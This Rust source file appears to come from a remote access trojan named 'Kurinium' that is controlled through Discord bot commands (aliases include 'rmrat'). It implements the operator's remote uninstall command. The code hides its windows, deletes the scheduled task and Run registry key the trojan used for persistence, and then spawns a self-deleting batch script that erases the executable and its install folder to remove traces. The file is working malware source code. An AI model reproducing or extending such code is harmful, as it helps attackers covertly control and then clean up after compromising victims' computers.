use crate::prelude::*;
use crate::config::Config;
use crate::core::exit_patcher::safe_exit;
use crate::installation::get_install_path;
use std::env;
use std::fs;
use std::process::Command;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;

#[poise::command(prefix_command, aliases("rmrat", "uni"))]
pub async fn uninstall(ctx: PoiseContext<'_>) -> Result<(), Error> {
    ctx.say("**Uninstalling Kurinium...**").await?;

    match perform_uninstall() {
        Ok(_) => {
            ctx.say("**Removed Kurinium successfully.**").await?;
        }
        Err(e) => {
            ctx.say(format!("**Uninstall error:** {}", e)).await?;
        }
    }

    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    safe_exit(0);
}

fn perform_uninstall() -> Result<(), Error> {
    let curr_exe = env::current_exe()?;
    let curr_exe_path = curr_exe.to_string_lossy().to_string();
    let task_name = Config::get_startup_config().task_name;
    let install_dir = get_install_path();
    let install_dir_path = install_dir.to_string_lossy().to_string();

    let _ = Command::new("schtasks")
        .args(["/delete", "/tn", &task_name, "/f"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    let _ = Command::new("reg")
        .args([
            "delete",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v", &task_name,
            "/f"
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    let _ = crate::core::startup::remove_startup(&task_name);
    let batch_script = format!(
        r#"@echo off
:loop
tasklist /FI "PID eq {pid}" 2>NUL | find /I /N "{pid}">NUL
if "%ERRORLEVEL%"=="0" (
    timeout /t 1 /nobreak >nul
    goto loop
)
timeout /t 2 /nobreak >nul
del /f /q "{exe_path}" 2>nul
rmdir /s /q "{dir_path}" 2>nul
del /f /q "%~f0" 2>nul
"#,
        pid = std::process::id(),
        exe_path = curr_exe_path,
        dir_path = install_dir_path
    );

    let temp_dir = env::temp_dir();
    let batch_path = temp_dir.join("uninstall.bat");
    fs::write(&batch_path, &batch_script)?;

    Command::new("cmd")
        .args(["/c", &batch_path.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()?;

    Ok(())
}
